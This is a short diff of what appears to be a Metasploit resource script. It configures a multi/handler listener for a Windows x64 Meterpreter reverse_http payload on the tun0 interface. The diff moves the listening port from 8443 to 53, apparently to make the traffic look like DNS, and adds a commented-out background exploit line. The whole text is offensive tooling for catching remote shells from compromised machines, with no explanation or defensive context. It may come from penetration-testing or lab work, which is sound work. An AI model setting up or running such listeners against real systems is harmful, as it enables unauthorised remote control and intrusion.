@@ -3,6 +3,7 @@ spool msf.log
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_http
 set LHOST tun0
-set LPORT 8443
+set LPORT 53
 set EXITFUNC thread
 set EXITONSESSION false
+#exploit -j
